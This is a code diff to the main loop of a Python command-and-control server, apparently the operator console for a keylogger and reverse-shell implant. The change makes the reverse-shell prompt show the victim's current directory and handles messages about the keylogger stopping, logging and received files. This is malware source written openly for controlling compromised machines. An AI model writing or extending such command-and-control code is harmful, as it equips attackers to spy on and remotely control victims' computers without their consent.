@@ -99,19 +99,19 @@ def covert_header_to_dict(header: bytes) -> dict:
 
 #--------------- MAIN ---------------#    
 if __name__ == "__main__":
-    reverse_shell_active = False
+    current_reverse_shell_dir = ""
     command_and_control = CommandAndControl()
 
     while True:
-        if reverse_shell_active:
-            inpt = input("shell>")
+        if current_reverse_shell_dir:
+            inpt = input(current_reverse_shell_dir+">")
         else:
             inpt = input("enter command:")
         if inpt:
             if inpt == "help":
                 command_and_control.print_usage()
                 
-            elif inpt == "exit" and not reverse_shell_active:
+            elif inpt == "exit" and not current_reverse_shell_dir:
                 logging.info("stopping server")
                 break
             else:
@@ -125,7 +125,7 @@ if __name__ == "__main__":
                         command_and_control.receive_file(header)
                     else:
                         msg = command_and_control.receive_message(header)
-                            
+                        print(msg)
                         if msg == "keylogger stopped":
                             logging.info("keylogger stopped")
                             break
@@ -133,10 +133,10 @@ if __name__ == "__main__":
                             logging.info("logging activated")
                         elif msg == "logging deactivated":
                             logging.info("logging deactivated")
-                        elif msg == "reverse shell activated":
-                            reverse_shell_active = True
+                        elif msg.startswith("current dir"):
+                            current_reverse_shell_dir = msg[len("current dir"):]
                         elif msg == "reverse shell deactivated":
-                            reverse_shell_active = False
+                            current_reverse_shell_dir = ""
                         elif msg == "unknown command":
                             logging.info(f"unknown command: {inpt}")
                         else:
